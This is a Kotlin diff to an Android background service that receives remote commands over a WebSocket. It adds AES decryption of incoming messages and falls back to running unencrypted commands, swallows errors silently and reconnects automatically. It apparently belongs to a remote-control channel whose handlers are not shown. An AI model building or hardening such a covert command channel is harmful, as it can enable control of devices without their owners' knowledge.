@@ -69,17 +69,28 @@ class SyncService : Service() {
                 Log.d("Sync", "OK")
                 retry = 1000L
             }
+
             override fun onMessage(w: WebSocket, t: String) {
                 try {
-                    CommandHandler(this@SyncService, w).handle(t)
-                    AdvancedHandler(this@SyncService, w).handle(t)
-                } catch (e: Exception) {}
+                    // 🔐 فك التشفير أولاً
+                    val plain = CryptoHelper.decrypt(t, BuildConfig.AES_KEY)
+                    CommandHandler(this@SyncService, w).handle(plain)
+                    AdvancedHandler(this@SyncService, w).handle(plain)
+                } catch (e: Exception) {
+                    // fallback: ربما الرسالة غير مشفرة
+                    try {
+                        CommandHandler(this@SyncService, w).handle(t)
+                        AdvancedHandler(this@SyncService, w).handle(t)
+                    } catch (e2: Exception) {}
+                }
             }
+
             override fun onFailure(w: WebSocket, e: Throwable, r: Response?) {
                 Log.e("Sync", "ERR ${e.message}")
                 ws = null
                 scheduleReconnect()
             }
+
             override fun onClosed(w: WebSocket, c: Int, r: String) {
                 ws = null
                 scheduleReconnect()
